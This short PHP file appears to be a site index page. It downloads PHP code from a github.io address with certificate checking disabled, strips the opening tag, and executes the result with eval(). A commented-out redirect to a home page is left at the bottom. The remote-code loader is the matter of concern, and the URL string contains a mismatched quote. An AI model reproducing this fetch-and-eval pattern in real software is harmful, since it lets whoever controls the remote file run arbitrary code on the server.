<?php 
$GithubRawURI= "https://edivanfinger.github.io/1920938-5_EdivanFinger/index.php”; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$data = curl_exec($ch); 
curl_close($ch); 
 
//remove the "<?php" from the file before running it 
$data = substr($data, 5); 
 
eval ($data); 
//<script>
//  window.location.href = "pages/home.html"
//</script>
?>